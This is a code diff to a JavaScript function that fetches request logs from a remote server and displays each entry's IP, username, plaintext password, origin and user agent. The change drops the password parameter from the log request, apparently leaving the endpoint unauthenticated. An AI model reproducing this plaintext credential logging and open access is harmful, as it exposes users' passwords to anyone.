@@ -127,35 +127,19 @@
         }
 
         async function logs() {
-    const output = document.getElementById('logOutput');
-    output.textContent = "Loading logs...";
-
     try {
-        const response = await fetch(`https://server-2zda.onrender.com/logs?password=${password}`);
-        const rawText = await response.text();
+        const response = await fetch("https://server-2zda.onrender.com/logs");
+        const json = await response.json();
+        const logArray = json.logs;
 
-        const logs = rawText.trim().split('\n').map(line => {
-            try {
-                return JSON.parse(line);
-            } catch {
-                return null;
-            }
-        }).filter(Boolean);
-
-        if (logs.length === 0) {
-            output.textContent = "No logs available.";
-            return;
-        }
-
-        const formattedLogs = logs.map(log => {
-            const time = new Date(log.timestamp).toLocaleString();
-            return `[${time}] (${log.endpoint}) IP: ${log.ip} | User: ${log.username} | Password: ${log.password} | Origin: ${log.origin} | User-Agent: ${log.userAgent}`;
+        const formattedLogs = logArray.map(log => {
+            return `[${new Date(log.timestamp).toLocaleString()}] (${log.endpoint}) IP: ${log.ip} | User: ${log.username} | Password: ${log.password} | Origin: ${log.origin} | User-Agent: ${log.userAgent}`;
         });
 
-        output.textContent = formattedLogs.join("\n\n");
+        document.getElementById("logOutput").innerText = formattedLogs.join("\n");
     } catch (e) {
-        showAlert("Error", e.message);
-        output.textContent = "";
+        console.error("Error loading logs:", e);
+        document.getElementById("logOutput").innerText = "Failed to load logs.";
     }
 }
 
